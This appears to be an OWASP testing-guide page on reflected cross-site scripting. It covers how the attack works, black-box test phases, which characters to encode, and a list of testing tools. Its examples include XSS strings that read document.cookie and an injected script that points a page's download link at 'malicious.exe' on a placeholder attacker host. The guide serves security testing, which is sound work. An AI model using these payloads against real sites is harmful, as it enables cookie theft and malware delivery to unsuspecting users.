<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Reflected Cross Site Scripting</title>
</head><body><b>Summary </b><br/>
Reflected <a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">Cross-site Scripting (XSS)</a>&nbsp;occur when an attacker injects browser executable code within a single HTTP response. The injected attack is not stored within the application itself; it is non-persistent and only impacts users who open a maliciously crafted link or third-party web page. The attack string is included as part of the crafted URI or HTTP parameters, improperly processed by the application, and returned to the victim. <br/>
<br/>
Reflected XSS are the most frequent type of XSS attacks found in the wild. Reflected XSS attacks are also known as non-persistent XSS attacks and, since the attack payload is delivered and executed via a single request and response, they are also referred to as first-order or type 1 XSS. <br/>
<br/>
When a web application is vulnerable to this type of attack, it will pass unvalidated input sent through requests back to the client. The common modus operandi of the attack includes a design step, in which the attacker creates and tests an offending URI, a social engineering step, in which she convinces her victims to load this URI on their browsers, and the eventual execution of the offending code using the victim's browser. <br/>
<br/>
Commonly the attacker's code is written in the Javascript language, but other scripting languages are also used, e.g., ActionScript and VBScript. Attackers typically leverage these vulnerabilities to install key loggers, steal victim cookies, perform clipboard theft, and change the content of the page (e.g., download links). <br/>
<br/>
One of the primary difficulties in preventing XSS vulnerabilities is proper character encoding. In some cases, the web server or the web application could not be filtering some encodings of characters, so, for example, the web application might filter out "&lt;script&gt;", but might not filter %3cscript%3e which simply includes another encoding of tags. <br/>
<br/>
<b>&nbsp;How to Test<br/>
</b><b>Black Box testing </b><br/>
A black-box test will include at least three phases: <br/>
1. Detect input vectors. For each web page, the tester must determine all the web application's user-defined variables and how to input them. This includes hidden or non-obvious inputs such as HTTP parameters, POST data, hidden form field values, and predefined radio or selection values. Typically in-browser HTML editors or web proxies are used to view these hidden variables. See the example below. <br/>
<br/>
2. Analyze each input vector to detect potential vulnerabilities. To detect an XSS vulnerability, the tester will typically use specially crafted input data with each input vector. Such input data is typically harmless, but trigger responses from the web browser that manifests the vulnerability. Testing data can be generated by using a web application fuzzer, an automated predefined list of known attack strings, or manually. <br/>
Some example of such input data are the following: <br/>
&lt;script&gt;alert(123)&lt;/script&gt;<br/>
“&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>
<br/>
<br/>
For a comprehensive list of potential test strings, see the <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS Filter Evasion Cheat Sheet</a>. <br/>
<br/>
3. For each test input attempted in the previous phase, the tester will analyze the result and determine if it represents a vulnerability that has a realistic impact on the web application's security. This requires examining the resulting web page HTML and searching for the test input. Once found, the tester identifies any special characters that were not properly encoded, replaced, or filtered out. The set of vulnerable unfiltered special characters will depend on the context of that section of HTML. <br/>
<br/>
Ideally all HTML special characters will be replaced with HTML entities. The key HTML entities to identify are: <br/>
&gt; (greater than) <br/>
&lt; (less than) <br/>
&amp; (ampersand)<br/>
' (apostrophe or single quote)<br/>
" (double quote)<br/>
<br/>
<br/>
However, a full list of entities is defined by the HTML and XML specifications. Wikipedia has a complete reference <a href="http://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references">[1]</a>. <br/>
<br/>
Within the context of an HTML action or JavaScript code, a different set of special characters will need to be escaped, encoded, replaced, or filtered out. These characters include: <br/>
\n (new line)<br/>
\r (carriage return)<br/>
\' (apostrophe or single quote)<br/>
\" (double quote)<br/>
\\ (backslash)<br/>
\uXXXX (unicode values)<br/>
&nbsp; <br/>
For a more complete reference, see the Mozilla JavaScript guide. <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Values,_variables,_and_literals#Using_special_characters_in_strings">[2]</a>&nbsp; <br/>
<br/>
<b>Example 1 </b><br/>
For example, consider a site that has a welcome notice " Welcome %username% " and a download link. <br/>
<br/>
The tester must suspect that every data entry point can result in an XSS attack. To analyze it, the tester will play with the user variable and try to trigger the vulnerability. <br/>
<br/>
Let's try to click on the following link and see what happens: <br/>
http://example.com/index.php?user=&lt;script&gt;alert(123)&lt;/script&gt; &nbsp; &nbsp;<br/>
<br/>
If no sanitization is applied this will result in the following popup: &nbsp; <br/>
<br/>
This indicates that there is an XSS vulnerability and it appears that the tester can execute code of his choice in anybody's browser if he clicks on the tester's link. <br/>
<br/>
<br/>
<b>&nbsp;Example 2 </b><br/>
Let's try other piece of code (link): <br/>
http://example.com/index.php?user=&lt;script&gt;window.onload = function() {var AllLinks=document.getElementsByTagName("a"); <br/>
AllLinks[0].href = "http://badexample.com/malicious.exe"; }&lt;/script&gt; &nbsp; <br/>
<br/>
This produces the following behavior: &nbsp; <br/>
<br/>
This will cause the user, clicking on the link supplied by the tester, to download the file malicious.exe from a site he controls. <br/>
<br/>
<br/>
<b>Gray Box testing </b><br/>
Gray Box testing is similar to Black box testing. In gray box testing, the pen-tester has partial knowledge of the application. In this case, information regarding user input, input validation controls, and how the user input is rendered back to the user might be known by the pen-tester. <br/>
<br/>
If source code is available (White Box), all variables received from users should be analyzed. Moreover the tester should analyze any sanitization procedures implemented to decide if these can be circumvented. <br/>
&nbsp; <br/>
<br/>
Tools <ul><li>&nbsp;<b><a href="https://www.owasp.org/index.php/OWASP_CAL9000_Project">OWASP CAL9000</a></b>&nbsp;</li>
</ul>
<br/>
CAL9000 is a collection of web application security testing tools that complement the feature set of current web proxies and automated scanners. It's hosted as a reference at <a href="https://1337.yehg.net/CAL9000/">https://1337.yehg.net/CAL9000/</a>&nbsp;. <br/>
&nbsp;<ul><li>&nbsp;<b>PHP Charset Encoder(PCE)</b>&nbsp;- <a href="http://h4k.in/encoding">http://h4k.in/encoding</a>&nbsp;[mirror: <a href="http://yehg.net/e">http://yehg.net/e</a>&nbsp;]</li>
</ul>
<br/>
This tool helps you encode arbitrary texts to and from 65 kinds of charsets. Also some encoding functions featured by JavaScript are provided. <br/>
&nbsp;<ul><li>&nbsp;<b>HackVertor</b>&nbsp;- <a href="http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php">http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php</a></li>
</ul>
<br/>
It provides multiple dozens of flexible encoding for advanced string manipulation attacks. <br/>
&nbsp;<ul><li>&nbsp;<b><a href="https://www.owasp.org/index.php/OWASP_WebScarab_Project">WebScarab</a></b></li>
</ul>
<br/>
WebScarab is a framework for analysing applications that communicate using the HTTP and HTTPS protocols. <br/>
&nbsp;<ul><li>&nbsp;<b>XSS-Proxy</b>&nbsp;- <a href="http://xss-proxy.sourceforge.net/">http://xss-proxy.sourceforge.net/</a></li>
</ul>
<br/>
XSS-Proxy is an advanced Cross-Site-Scripting (XSS) attack tool. <br/>
&nbsp;<ul><li>&nbsp;<b>ratproxy</b>&nbsp;- <a href="http://code.google.com/p/ratproxy/">http://code.google.com/p/ratproxy/</a></li>
</ul>
<br/>
A semi-automated, largely passive web application security audit tool, optimized for an accurate and sensitive detection, and automatic annotation, of potential problems and security-relevant design patterns based on the observation of existing, user-initiated traffic in complex web 2.0 environments. <br/>
&nbsp;<ul><li>&nbsp;<b>Burp Proxy</b>&nbsp;- <a href="http://portswigger.net/proxy/">http://portswigger.net/proxy/</a></li>
</ul>
<br/>
Burp Proxy is an interactive HTTP/S proxy server for attacking and testing web applications. <br/>
&nbsp;<ul><li>&nbsp;<b>OWASP Zed Attack Proxy (ZAP)</b>&nbsp;- <a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project">OWASP_Zed_Attack_Proxy_Project</a></li>
</ul>
<br/>
ZAP is an easy to use integrated penetration testing tool for finding vulnerabilities in web applications. It is designed to be used by people with a wide range of security experience and as such is ideal for developers and functional testers who are new to penetration testing. ZAP provides automated scanners as well as a set of tools that allow you to find security vulnerabilities manually. <br/>
&nbsp;<ul><li>&nbsp;<b>OWASP Xenotix XSS Exploit Framework</b>&nbsp;- <a href="https://www.owasp.org/index.php/OWASP_Xenotix_XSS_Exploit_Framework">OWASP_Xenotix_XSS_Exploit_Framework</a></li>
</ul>
<br/>
OWASP Xenotix XSS Exploit Framework is an advanced Cross Site Scripting (XSS) vulnerability detection and exploitation framework. It provides Zero False Positive scan results with its unique Triple Browser Engine (Trident, WebKit, and Gecko) embedded scanner. It is claimed to have the world’s 2nd largest XSS Payloads of about 1600+ distinctive XSS Payloads for effective XSS vulnerability detection and WAF Bypass. Xenotix Scripting Engine allows you to create custom test cases and addons over the Xenotix API. It is incorporated with a feature rich Information Gathering module for target Reconnaissance. The Exploit Framework includes offensive XSS exploitation modules for Penetration Testing and Proof of Concept creation. <br/>
<br/>
<b>References </b><br/>
<b>OWASP Resources</b><br/>
<ul><li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS Filter Evasion Cheat Sheet</a>&nbsp;</li>
</ul>
<br/>
<b>Books</b><br/>
<ul><li>&nbsp;Joel Scambray, Mike Shema, Caleb Sima - "Hacking Exposed Web Applications", Second Edition, McGraw-Hill, 2006 - <a href="https://www.owasp.org/index.php/Special:BookSources/0072262290">ISBN 0-07-226229-0</a></li>
<li>&nbsp;Dafydd Stuttard, Marcus Pinto - "The Web Application's Handbook - Discovering and Exploiting Security Flaws", 2008, Wiley, <a href="https://www.owasp.org/index.php/Special:BookSources/9780470170779">ISBN 978-0-470-17077-9</a></li>
<li>&nbsp;Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. Petkov, Anton Rager, Seth Fogie - "Cross Site Scripting Attacks: XSS Exploits and Defense", 2007, Syngress, ISBN-10: 1-59749-154-3</li>
</ul>
<br/>
<b>Whitepapers</b><br/>
&nbsp;<ul><li>&nbsp;<b>CERT</b>&nbsp;- Malicious HTML Tags Embedded in Client Web Requests: <a href="http://www.cert.org/advisories/CA-2000-02.html">Read</a></li>
<li>&nbsp;<b>Rsnake</b>&nbsp;- XSS Cheat Sheet: <a href="http://ha.ckers.org/xss.html">Read</a></li>
<li>&nbsp;<b>cgisecurity.com</b>&nbsp;- The Cross Site Scripting FAQ: <a href="http://www.cgisecurity.com/articles/xss-faq.shtml">Read</a></li>
<li>&nbsp;<b>G.Ollmann</b>&nbsp;- HTML Code Injection and Cross-site scripting: <a href="http://www.technicalinfo.net/papers/CSS.html">Read</a></li>
<li>&nbsp;<b>A. Calvo, D.Tiscornia</b>&nbsp;- alert('A javascritp agent'): <a href="http://www.coresecurity.com/corelabs-research/publications/alert-a-javascript-agent">Read</a>&nbsp;</li>
<li>&nbsp;<b>S. Frei, T. Dübendorfer, G. Ollmann, M. May</b>&nbsp;- Understanding the Web browser threat: <a href="https://www.owasp.org/index.php/Special:Categories">Read</a></li>
</ul>
</body></html>